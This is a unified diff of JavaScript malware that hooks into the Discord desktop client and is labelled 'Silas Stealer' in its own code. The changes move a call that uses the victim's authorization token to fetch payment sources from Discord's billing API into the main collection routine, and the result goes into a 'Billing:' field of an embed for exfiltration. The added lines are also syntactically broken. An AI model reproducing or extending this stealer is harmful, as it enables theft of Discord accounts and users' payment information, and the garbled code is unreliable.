@@ -76,14 +76,8 @@ function GetBadges(flags) {
     return badges
 }
 
-function PM(token) {
-    const window = BrowserWindow.getAllWindows()[0];
-window.webContents.executeJavaScript(`
-var xmlHttp = new XMLHttpRequest();
-xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
-xmlHttp.setRequestHeader("Authorization", "${token}");
-xmlHttp.send( null );
-xmlHttp.responseText`, !0).then((sex) => {
+function PM(sex) {
+    
 var pm = JSON.parse(sex)
     var billing = "";
     pm.forEach(z => {
@@ -102,7 +96,7 @@ var pm = JSON.parse(sex)
     }
     return billing
 
-})
+
 }
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
@@ -359,6 +353,12 @@ xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
 xmlHttp.setRequestHeader("Authorization", "${token}");
 xmlHttp.send( null );
 xmlHttp.responseText;`, !0).then((info) => {
+var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
+        xmlHttp.setRequestHeader("Authorization", "${token}");
+        xmlHttp.send( null );
+        xmlHttp.responseText`, !0).then((sex) => {
+
     const json = JSON.parse(info);
     var params = {
         username: "Silas Stealer",
@@ -395,7 +395,7 @@ xmlHttp.responseText;`, !0).then((info) => {
 },
 {
     "name": " <a:nitro:942395826544705626> **Billing:**",
-                            "value": `${PM(token)}`,
+                            "value": `${PM(sex)}`,
                             "inline": false
     },
 
@@ -415,6 +415,7 @@ xmlHttp.responseText;`, !0).then((info) => {
 })
     
 			}))
+}))
 		}
 	}
 	if (details.url.endsWith("users/@me")) {
